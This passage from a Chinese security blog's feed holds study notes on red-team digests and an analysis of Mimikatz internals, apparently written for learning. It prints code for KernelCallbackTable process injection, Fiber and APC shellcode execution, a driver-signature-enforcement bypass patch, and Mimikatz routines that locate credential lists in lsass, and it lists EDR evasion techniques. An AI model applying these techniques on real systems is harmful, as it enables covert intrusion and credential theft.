    <content type="html"><![CDATA[<h2 id="0x00-这一周的推送主要介绍的都是一些工具"><a href="#0x00-这一周的推送主要介绍的都是一些工具" class="headerlink" title="0x00 这一周的推送主要介绍的都是一些工具"></a>0x00 这一周的推送主要介绍的都是一些工具</h2><p><a href="https://mp.weixin.qq.com/s/X3FnWqdL-HfzFqfwNntQ6Q" target="_blank" rel="external">每周蓝军技术推送（2022.4.30-5.6)</a></p><a id="more"></a><h2 id="0x01-nim语言轻量化C2"><a href="#0x01-nim语言轻量化C2" class="headerlink" title="0x01 nim语言轻量化C2"></a>0x01 nim语言轻量化C2</h2><ul><li>nimc2 是使用nim编写的C2框架，目前来说作者更新的很快</li><li>生成的implant免杀效果还是很好的</li><li>Ref:<a href="https://github.com/d4rckh/nimc2/blob/main/README.md" target="_blank" rel="external">https://github.com/d4rckh/nimc2/blob/main/README.md</a></li></ul><h2 id="0x02-可注入PE转换工具v1-0版本发布"><a href="#0x02-可注入PE转换工具v1-0版本发布" class="headerlink" title="0x02 可注入PE转换工具v1.0版本发布"></a>0x02 可注入PE转换工具v1.0版本发布</h2><ul><li><p>pe_to_shellcode这款工具原理就是重新复写PE文件DOS头，因为装载器装载PE文件会读取MZ头，这块不能变，剩下的可以进行修改，从第五行开始，定位当前EIP，第六行，ebx为EIP，<code>sub ebx,9</code>则表示ebx为ImageBase，然后加一个常量，最终跳转到入口点。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="string">"\x4D"</span> //<span class="keyword">dec</span> <span class="built_in">ebp</span></div><div class="line"><span class="string">"\x5A"</span> //<span class="keyword">pop</span> <span class="built_in">edx</span></div><div class="line"><span class="string">"\x45"</span> //<span class="keyword">inc</span> <span class="built_in">ebp</span></div><div class="line"><span class="string">"\x52"</span> //<span class="keyword">push</span> <span class="built_in">edx</span></div><div class="line"><span class="string">"\xE8\x00\x00\x00\x00"</span> //<span class="keyword">call</span> &lt;next_line&gt;</div><div class="line"><span class="string">"\x5B"</span> // <span class="keyword">pop</span> <span class="built_in">ebx</span></div><div class="line"><span class="string">"\x48\x83\xEB\x09"</span> // <span class="keyword">sub</span> <span class="built_in">ebx</span>,<span class="number">9</span></div><div class="line"><span class="string">"\x53"</span> // <span class="keyword">push</span> <span class="built_in">ebx</span> (Image Base)</div><div class="line"><span class="string">"\x48\x81\xC3"</span> // <span class="keyword">add</span> <span class="built_in">ebx</span>,</div><div class="line"><span class="string">"\x59\x04\x00\x00"</span> // value</div><div class="line"><span class="string">"\xFF\xD3"</span> // <span class="keyword">call</span> <span class="built_in">ebx</span></div><div class="line"><span class="string">"\xc3"</span><span class="comment">; // ret</span></div></pre></td></tr></table></figure></li><li><p>Ref:<a href="https://github.com/hasherezade/pe_to_shellcode" target="_blank" rel="external">https://github.com/hasherezade/pe_to_shellcode</a></p></li></ul><h2 id="0x03-禁用驱动程序签名强制执行技术"><a href="#0x03-禁用驱动程序签名强制执行技术" class="headerlink" title="0x03 禁用驱动程序签名强制执行技术"></a>0x03 禁用驱动程序签名强制执行技术</h2><ul><li><p>作者首先介绍了，在windows10以前的操作系统，禁用驱动程序强制签名是很容易的，只需要将<code>g_CiOptions</code>设置为0即可。</p></li><li><p>但是在windows10的计算机中，微软启用了基于虚拟化的安全性VBS(Virtualization Based Security)和虚拟机托管程序代码完整性HVCI(Hypervisor Code Integrity)，就不可以很简单的修改内核数据了。</p></li><li><p>所以作者开始寻找在启动VBS的情况下，禁用DSE的方法。</p></li><li><p>根本原理就是通过Patch禁用DSE，首先作者针对<code>CiCheckPolicyBits</code>下断，并查看栈回溯，发现<code>CiValidateImageHeader</code>这是负责验证我们的驱动程序是否满足签名要求的函数,然后作者尝试加载一个未签名的驱动程序，并查看 <code>CiValidateImageHeader</code>的返回值，发现该函数返回值是一个NTSTATUS值(c0000428)，所以作者猜测只需要该函数返回为STATUS_SUCCESS（0）即可。所以只需要寻找一个方法Patch该函数即可。</p></li><li><p>首先作者将虚拟地址转化为PTE(页目录表项)</p></li><li><p>作者通过使用暴力搜索特征码的方式最终定位到了<code>CiValidateImageHeader</code>函数地址，然后Patch如下代码即可。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">xor</span> <span class="built_in">rax</span>, <span class="built_in">rax</span><span class="comment">; ret</span></div></pre></td></tr></table></figure></li><li><p>这篇文章涉及到好多内核的知识，看的不深入。</p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-这一周的推送主要介绍的都是一些工具&quot;&gt;&lt;a href=&quot;#0x00-这一周的推送主要介绍的都是一些工具&quot; class=&quot;headerlink&quot; title=&quot;0x00 这一周的推送主要介绍的都是一些工具&quot;&gt;&lt;/a&gt;0x00 这一周的推送主要介绍的都是一些工具&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/X3FnWqdL-HfzFqfwNntQ6Q&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;每周蓝军技术推送（2022.4.30-5.6)&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="攻防技术" scheme="https://findream.github.io/categories/%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>绿盟科技-每周蓝军技术推送（2022.4.16-4.22）学习</title>
    <link href="https://findream.github.io/2022/04/23/%E7%BB%BF%E7%9B%9F%E7%A7%91%E6%8A%80-%E6%AF%8F%E5%91%A8%E8%93%9D%E5%86%9B%E6%8A%80%E6%9C%AF%E6%8E%A8%E9%80%81%EF%BC%882022.4.16-4.22%EF%BC%89/"/>
    <id>https://findream.github.io/2022/04/23/绿盟科技-每周蓝军技术推送（2022.4.16-4.22）/</id>
    <published>2022-04-23T06:02:11.000Z</published>
    <updated>2022-05-23T11:44:41.971Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-企业级EDR绕过技术"><a href="#0x01-企业级EDR绕过技术" class="headerlink" title="0x01 企业级EDR绕过技术"></a>0x01 企业级EDR绕过技术</h2><ul><li>原文名称：A blueprint for evading industry leading endpoint protection in 2022</li><li>作者主要介绍了规避现代EDR的几种常见思路</li></ul><a id="more"></a><h2 id="0x02-构建API调用框架绕过杀软hook"><a href="#0x02-构建API调用框架绕过杀软hook" class="headerlink" title="0x02 构建API调用框架绕过杀软hook"></a>0x02 构建API调用框架绕过杀软hook</h2><ul><li><p>通常API函数调用过程如下：<br>3环API(kernel32.dll) -&gt; ntdll.dll -&gt; sysenter -&gt; KiFastCallentry -&gt; SSDT -&gt; 真正调用的0环API</p></li><li><p>文章作者的思路是既然应用层API调用都要经过SSDT，继而调用R0的函数，EDR产品会使用SSDT hook来监控敏感的调用。<br>所以，我们通过伪造的SSDT，来规避EDR产品检测。</p></li><li>作者首先通过中断门，进入R0，然后在伪造SSDT。这样的话，R3程序通过中断门，通过伪造的SSDT进入指定的内核函数。然后规避EDR。</li><li>但是，这个方法比较理想化，第一：win7及以上系统无法通过中断门进入，所以，理论上这个方法只能在windowsxp下实现，第二：因为涉及到驱动文件，如何保证文件落地不被查杀，第二，如何保证驱动能被安全的加载，第三，合理有效的数字签名如何获取。<br>Ref:<a href="https://tttang.com/archive/1546/" target="_blank" rel="external">https://tttang.com/archive/1546/</a></li></ul><h2 id="0x03-Kernelcallbacktable-注入"><a href="#0x03-Kernelcallbacktable-注入" class="headerlink" title="0x03 Kernelcallbacktable 注入"></a>0x03 Kernelcallbacktable 注入</h2><ul><li><p>KernelCallbackTable(系统回调表)是由KeUserModeCallback函数调用，每当GUI进程加载User32.dll的时候，系统就会通过PEB找到KernelCallbackTable地址，并进行初始化为函数数组，这个函数数组中的函数通常用于响应窗口消息。</p></li><li><p>所以，攻击者可以通过修改远程进程的KernelCallbackTable的函数数组，然后发送一个对应的窗口消息，从而实现劫持执行流。</p></li><li><p>本文作者参考modexpblog的思路：</p><ul><li><p>通过窗口获取目标进程Pid，从而获取目标进程的伪句柄。</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">HANDLE hProcess = OpenProcess(<span class="name">PROCESS_ALL_ACCESS</span>, FALSE, pid)<span class="comment">;</span></div><div class="line">printf(<span class="string">"[+] Process Handle: 0x%p\n"</span>, hProcess)<span class="comment">;</span></div></pre></td></tr></table></figure></li><li><p>通过调用<code>NtQueryInformationProcess</code>获取ProcessBasicInformation，pbi结构体中保存着Peb的地址</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">PROCESS_BASIC_INFORMATION pbi<span class="comment">;</span></div><div class="line">pNtQueryInformationProcess myNtQueryInformationProcess = (<span class="name">pNtQueryInformationProcess</span>)GetProcAddress(<span class="name">GetModuleHandle</span>(<span class="name">L</span><span class="string">"ntdll.dll"</span>), <span class="string">"NtQueryInformationProcess"</span>)<span class="comment">;</span></div><div class="line">myNtQueryInformationProcess(<span class="name">hProcess</span>, ProcessBasicInformation, <span class="symbol">&amp;pbi</span>, sizeof(<span class="name">pbi</span>), NULL)<span class="comment">;</span></div></pre></td></tr></table></figure></li></ul></li></ul><pre><code>* 通过PEB获取KernelCallbackTable</code></pre><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">PEB peb;</div><div class="line">ReadProcessMemory(hProcess, pbi.PebBaseAddress, &amp;peb, <span class="keyword">sizeof</span>(peb), <span class="literal">NULL</span>);</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[+] PEB Address: 0x%p\n"</span>, pbi.PebBaseAddress);</div><div class="line">KERNELCALLBACKTABLE kct;</div><div class="line">ReadProcessMemory(hProcess, peb.KernelCallbackTable, &amp;kct, <span class="keyword">sizeof</span>(kct), <span class="literal">NULL</span>);</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[+] KernelCallbackTable Address: 0x%p\n"</span>, peb.KernelCallbackTable);</div><div class="line">``` </div><div class="line">    * 将shellcode和新的KernelCallbackTable写入远程进程</div></pre></td></tr></table></figure><p>LPVOID newKCTAddr = VirtualAllocEx(hProcess, NULL, sizeof(kct), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);<br>kct.__fnCOPYDATA = (ULONG_PTR)payloadAddr;<br>WriteProcessMemory(hProcess, newKCTAddr, &amp;kct, sizeof(kct), NULL);<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="bullet">* </span>更新一下PEB的KernelCallbackTable地址。</div></pre></td></tr></table></figure></p><p>// Update the PEB<br>WriteProcessMemory(hProcess, (PBYTE)pbi.PebBaseAddress + offsetof(PEB, KernelCallbackTable), &amp;newKCTAddr, sizeof(ULONG_PTR), NULL);<br>printf(“[+] Remote process PEB updated\n”);<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="bullet">* </span>最后，通过发送窗口请求，响应操作</div></pre></td></tr></table></figure></p><p>COPYDATASTRUCT cds;<br>WCHAR msg[] = L”Pwn”;<br>cds.dwData = 1;<br>cds.cbData = lstrlen(msg) * 2;<br>cds.lpData = msg;<br>SendMessage(hWindow, WM_COPYDATA, (WPARAM)hWindow, (LPARAM)&amp;cds);<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="bullet">* </span>Ref:[<span class="string">Adventures with KernelCallbackTable Injection</span>](<span class="link">https://captmeelo.com/redteam/maldev/2022/04/21/kernelcallbacktable-injection.html</span>)</div><div class="line"></div><div class="line"><span class="bullet">* </span>Ref:[<span class="string">Windows Process Injection: KernelCallbackTable used by FinFisher / FinSpy</span>](<span class="link">https://modexp.wordpress.com/2019/05/25/windows-injection-finspy/</span>)</div><div class="line"></div><div class="line"><span class="bullet">* </span>Ref:[<span class="string">攻击技术研判 ｜Lazarus搭载新的载荷执行与控制流劫持技术(此处原文应该来自M01n)</span>](<span class="link">http://www.ctfiot.com/28074.html</span>)</div><div class="line"></div><div class="line"><span class="section">## 0x04 利用Exception Directory获取系统服务调用号</span></div><div class="line"><span class="bullet">* </span>这篇文章思维跳跃度太高，没太看明白。</div><div class="line"></div><div class="line"><span class="section">## 0x05 常见的PE打包器在Windows 11中的免杀测试</span></div><div class="line"><span class="bullet">* </span>这几款免杀框架主要都采用了一下技术：</div><div class="line"><span class="bullet">* </span>Loader[ScareCrow]：通过将恶意的dll注入到诸如Wscript,Msiexe等系统进程中，规避一些EDR的检测，但效果估计差强人意。</div><div class="line"><span class="bullet">* </span>Console[ScareCrow]:通常，恶意软件需要隐藏窗口是通过创建进程时，设置ldflags标志实现的，但是这很容易被EDR检测到，所以，通过GetConsoleWindow和ShowWindow实现窗口隐藏。</div><div class="line"><span class="bullet">* </span>ByPass AMSI和ETW[ScareCrow,inceptor等]:这没什么好说的，正常的都会这样做的。</div><div class="line"><span class="bullet">* </span>Delivery[ScareCrow]:这个没太看懂，应该是一种远程命令执行，或者远程数据传递的技术吧。</div><div class="line"><span class="bullet">* </span>AntiDebug[PEzor]:反调试</div><div class="line"><span class="bullet">* </span>unhook[PEzor]:移除部分用户层Hook</div><div class="line"><span class="bullet">* </span>syscalls[PEzor，Nimcrypt2等]:syscall 规避用户层Hook</div><div class="line"><span class="bullet">* </span>Shellcode和函数名加密[charlotte,FourEye,inceptor等等]</div><div class="line"><span class="bullet">* </span>API动态调用[charlotte]:charlotte所指的动态调用是指使用GetProcAddress获取函数地址后，然后调用。</div><div class="line"><span class="bullet">* </span>正常文件插入shellcode[Sh3llter,msf,cobaltstrike旧版本]：可以有效降低信息熵，但是cs在近几个版本中取消了。</div><div class="line"><span class="bullet">* </span>Fiber(纤程)和APC[FourEye，Nimcrypt2]：FourEye的这几种方法都是在处理调用shellcode如何实现免杀，常见的直接调用shellcode不容易绕过EDR。</div><div class="line"><span class="code">    * Fiber这个方案主要调用CreateFiber创建一个纤程对象，然后调用SwitchToFiber选择即可。</span></div><div class="line"><span class="code">    * APC这个方案就是调用QueueUserAPC插入一个APC到队列中</span></div><div class="line"><span class="bullet">* </span>Ntdll ByPass</div><div class="line"><span class="bullet">* </span>通过一些不常见的语言Nim来减少特征[Nimcrypt2]</div><div class="line"><span class="bullet">* </span>系统调用名称随机化[Nimcrypt2]:就是在获取API函数地址的时候，使用随机的函数名称，这样减缓分析进度。</div><div class="line"><span class="bullet">* </span>LLVM混淆[Nimcrypt2]</div></pre></td></tr></table></figure></p><p>//Fiber<br>PVOID shellcodeLocation = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br>memcpy(shellcodeLocation, shellcode, sizeof shellcode);<br>PVOID shellcodeFiber = CreateFiber(NULL, (LPFIBER_START_ROUTINE)shellcodeLocation, NULL);<br>SwitchToFiber(shellcodeFiber);<br>//APC<br>char<em> buffer = (char</em>)Allocate(GetCurrentProcess(), 0, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br>CopyMemory(buffer, shellcode, shellcode_size);<br>QueueUserAPC((PAPCFUNC)buffer, hthread, (ULONG_PTR)buffer);<br>```</p><ul><li>===&gt;[TODO]如果要学怎么写一个免杀框架，<a href="https://github.com/klezVirus/inceptor" target="_blank" rel="external">inceptor</a>是一个很好地学习例子。</li><li>Ref:<a href="https://github.com/klezVirus/inceptor" target="_blank" rel="external">https://github.com/klezVirus/inceptor</a></li><li>Ref:<a href="https://assume-breach.medium.com/home-grown-red-team-testing-common-av-evasion-with-pe-packers-on-windows-11-a2a9e873fe13" target="_blank" rel="external">https://assume-breach.medium.com/home-grown-red-team-testing-common-av-evasion-with-pe-packers-on-windows-11-a2a9e873fe13</a></li><li>Ref:<a href="https://www.1ight.top/纤程注入shellcode/" target="_blank" rel="external">https://www.1ight.top/纤程注入shellcode/</a></li></ul><h2 id="0x06-攻击技术研判｜发现新招！攻击者投递伪装成文件夹的恶意LNK"><a href="#0x06-攻击技术研判｜发现新招！攻击者投递伪装成文件夹的恶意LNK" class="headerlink" title="0x06 攻击技术研判｜发现新招！攻击者投递伪装成文件夹的恶意LNK"></a>0x06 攻击技术研判｜发现新招！攻击者投递伪装成文件夹的恶意LNK</h2><ul><li>就是利用社会工程学伪装lnk执行后续恶意dll。</li><li><a href="https://mp.weixin.qq.com/s/rCEoKdi-_qLWw86vZKrVWA" target="_blank" rel="external">https://mp.weixin.qq.com/s/rCEoKdi-_qLWw86vZKrVWA</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-企业级EDR绕过技术&quot;&gt;&lt;a href=&quot;#0x01-企业级EDR绕过技术&quot; class=&quot;headerlink&quot; title=&quot;0x01 企业级EDR绕过技术&quot;&gt;&lt;/a&gt;0x01 企业级EDR绕过技术&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;原文名称：A blueprint for evading industry leading endpoint protection in 2022&lt;/li&gt;
&lt;li&gt;作者主要介绍了规避现代EDR的几种常见思路&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="攻防技术" scheme="https://findream.github.io/categories/%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>Mimikatz原理分析和检测</title>
    <link href="https://findream.github.io/2022/04/22/Mimikatz%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E5%92%8C%E6%A3%80%E6%B5%8B/"/>
    <id>https://findream.github.io/2022/04/22/Mimikatz原理分析和检测/</id>
    <published>2022-04-22T06:02:11.000Z</published>
    <updated>2022-05-23T11:58:32.551Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ul><li>这是学习Mimikatz工作原理的无总结笔记。主要包含了<code>sekurlsa::msv</code>,<code>sekurlsa::pth</code>,<code>lsadump::dcsync</code>,票据传递等功能的原理分析和检测。<a id="more"></a></li></ul><h2 id="sekurlsa-msv源码分析"><a href="#sekurlsa-msv源码分析" class="headerlink" title="sekurlsa::msv源码分析"></a>sekurlsa::msv源码分析</h2><ul><li>Mimikatz的sekurlsa::msv命令是用于获取NTLM协议加密的凭证</li><li>其在mimikatz\modules\sekurlsa\kuhl_m_sekurlsa.c中的NTSTATUS kuhl_m_sekurlsa_enum(PKUHL_M_SEKURLSA_ENUM callback, LPVOID pOptionalData)函数中实现。</li><li>具体原理是通过特征码定位Lsass.exe进程的lsasvr.dll中的LogonSessionList全局变量和LogonSessionListCount全局变量的地址，然后解析LogonSessionList结构体即可，LogonSessionList是一个双向链表(LIST_ENTRY)。</li><li><p>在NTSTATUS kuhl_m_sekurlsa_enum(PKUHL_M_SEKURLSA_ENUM callback, LPVOID pOptionalData)函数中，首先调用kuhl_m_sekurlsa_acquireLSA()函数用于获取相关模块信息，主要是在kull_m_process_getVeryBasicModuleInformations()函数中，通过PEB获取指定的lsasvr.dll基地址。</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">moduleInformation.NameDontUseOutsideCallback</span> = &amp;moduleName<span class="comment">;</span></div><div class="line"><span class="symbol">if</span>(kull_m_process_peb(memory, &amp;Peb, FALSE))</div><div class="line">&#123;</div><div class="line">aBuffer.<span class="keyword">address </span>= &amp;<span class="keyword">LdrData; </span>aProcess.<span class="keyword">address </span>= Peb.<span class="keyword">Ldr;</span></div><div class="line"><span class="keyword"></span><span class="meta">if</span>(kull_m_memory_copy(&amp;aBuffer, &amp;aProcess, sizeof(<span class="keyword">LdrData)))</span></div><div class="line"><span class="keyword"></span>&#123;</div><div class="line">for(</div><div class="line">aLire  = (PBYTE) (<span class="keyword">LdrData.InMemoryOrderModulevector.Flink) </span>- FIELD_OFFSET(<span class="keyword">LDR_DATA_TABLE_ENTRY, </span>InMemoryOrderLinks),</div><div class="line">fin    = (PBYTE) (Peb.<span class="keyword">Ldr) </span>+ FIELD_OFFSET(PEB_LDR_DATA, InLoadOrderModulevector)<span class="comment">;</span></div><div class="line">(aLire != fin) &amp;&amp; continueCallback<span class="comment">;</span></div><div class="line">aLire  = (PBYTE) <span class="keyword">LdrEntry.InMemoryOrderLinks.Flink </span>- FIELD_OFFSET(<span class="keyword">LDR_DATA_TABLE_ENTRY, </span>InMemoryOrderLinks)</div><div class="line">)</div><div class="line">&#123;</div><div class="line">aBuffer.<span class="keyword">address </span>= &amp;<span class="keyword">LdrEntry; </span>aProcess.<span class="keyword">address </span>= aLire<span class="comment">;</span></div><div class="line"><span class="meta">if</span>(continueCallback = kull_m_memory_copy(&amp;aBuffer, &amp;aProcess, sizeof(<span class="keyword">LdrEntry)))</span></div><div class="line"><span class="keyword"></span>&#123;</div><div class="line">moduleInformation.DllBase.<span class="keyword">address </span>= <span class="keyword">LdrEntry.DllBase;</span></div><div class="line"><span class="keyword"></span>moduleInformation.SizeOfImage = <span class="keyword">LdrEntry.SizeOfImage;</span></div><div class="line"><span class="keyword"></span>moduleName = <span class="keyword">LdrEntry.BaseDllName;</span></div><div class="line"><span class="keyword"></span><span class="meta">if</span>(moduleName.<span class="keyword">Buffer </span>= (PWSTR) LocalAlloc(LPTR, moduleName.MaximumLength))</div><div class="line">&#123;</div><div class="line">aBuffer.<span class="keyword">address </span>= moduleName.<span class="keyword">Buffer; </span>aProcess.<span class="keyword">address </span>= <span class="keyword">LdrEntry.BaseDllName.Buffer;</span></div><div class="line"><span class="keyword"></span><span class="meta">if</span>(kull_m_memory_copy(&amp;aBuffer, &amp;aProcess, moduleName.MaximumLength))</div><div class="line">&#123;</div><div class="line">kull_m_process_adjustTimeDateStamp(&amp;moduleInformation)<span class="comment">;</span></div><div class="line">continueCallback = callBack(&amp;moduleInformation, pvArg)<span class="comment">;</span></div><div class="line">&#125;</div><div class="line">LocalFree(moduleName.<span class="keyword">Buffer);</span></div><div class="line"><span class="keyword"></span>&#125;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">status = STATUS_SUCCESS<span class="comment">;</span></div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></li><li><p>然后通过kuhl_m_sekurlsa_utils_search()函数搜索LogonSessionList全局变量和LogonSessionListCount全局变量的地址,其中LsaSrvReferences数组存储着不同系统版本的索引特征码(位于kuhl_m_sekurlsa_utils.c文件中)</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">BOOL kuhl_m_sekurlsa_utils_search(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKUHL_M_SEKURLSA_LIB pLib)</div><div class="line">&#123;</div><div class="line">PVOID *pLogonSessionListCount = (cLsass-&gt;osContext.BuildNumber &lt; KULL_M_WIN_BUILD_2K3) ? NULL : ((PVOID *) &amp;LogonSessionListCount);</div><div class="line">return kuhl_m_sekurlsa_utils_search_generic(cLsass, pLib, LsaSrvReferences,  ARRAYSIZE(LsaSrvReferences), (PVOID *) &amp;LogonSessionList, pLogonSessionListCount, NULL, NULL);</div><div class="line">&#125;</div><div class="line">KULL_M_PATCH_GENERIC LsaSrvReferences[] = &#123;</div><div class="line">&#123;KULL_M_WIN_BUILD_XP,&#123;sizeof(PTRN_WIN5_LogonSessionList),PTRN_WIN5_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;-<span class="number">4</span>,   <span class="number">0</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_2K3,&#123;sizeof(PTRN_WIN5_LogonSessionList),PTRN_WIN5_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;-<span class="number">4</span>, -<span class="number">45</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_VISTA,&#123;sizeof(PTRN_WN60_LogonSessionList),PTRN_WN60_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">21</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_7,&#123;sizeof(PTRN_WN61_LogonSessionList),PTRN_WN61_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">19</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_8,&#123;sizeof(PTRN_WN6x_LogonSessionList),PTRN_WN6x_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">16</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_BLUE,&#123;sizeof(PTRN_WN63_LogonSessionList),PTRN_WN63_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">36</span>,  -<span class="number">6</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_10_1507,&#123;sizeof(PTRN_WN6x_LogonSessionList),PTRN_WN6x_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">16</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_10_1703,&#123;sizeof(PTRN_WN1703_LogonSessionList),PTRN_WN1703_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">23</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_10_1803,&#123;sizeof(PTRN_WN1803_LogonSessionList),PTRN_WN1803_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">23</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_10_1903,&#123;sizeof(PTRN_WN6x_LogonSessionList),PTRN_WN6x_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">23</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_2022,&#123;sizeof(PTRN_WN11_LogonSessionList),PTRN_WN11_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">24</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">&#125;;</div></pre></td></tr></table></figure></li><li><p>此时LogonSessionListCount，LogonSessionList两个变量，仅仅表示的是其在内存中的地址。需要通过kull_m_memory_copy获取其值。</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="title">securityStruct</span>.hMemory = cLsass.hLsassMem;</div><div class="line"><span class="title">if</span>(securityStruct.address = <span class="type">LogonSessionListCount</span>)       </div><div class="line">kull_m_memory_copy(&amp;<span class="class"><span class="keyword">data</span>, &amp;securityStruct, sizeof(<span class="type">ULONG</span>));   //<span class="keyword">data</span>-&gt;address 保存的是<span class="type">LogonSessionListCount</span>的值</span></div><div class="line"><span class="title">for</span>(i = <span class="number">0</span>; i &lt; nbListes; i++)</div><div class="line">&#123;</div><div class="line">securityStruct.address = &amp;<span class="type">LogonSessionList</span>[i];</div><div class="line"><span class="class"><span class="keyword">data</span>.address = &amp;pStruct;</span></div><div class="line"><span class="class"><span class="keyword">data</span>.hMemory = &amp;<span class="type">KULL_M_MEMORY_GLOBAL_OWN_HANDLE</span>;</span></div><div class="line"><span class="keyword">if</span>(aBuffer.address = <span class="type">LocalAlloc</span>(<span class="type">LPTR</span>, helper-&gt;tailleStruct))</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span>(kull_m_memory_copy(&amp;<span class="class"><span class="keyword">data</span>, &amp;securityStruct, sizeof(<span class="type">PVOID</span>)))   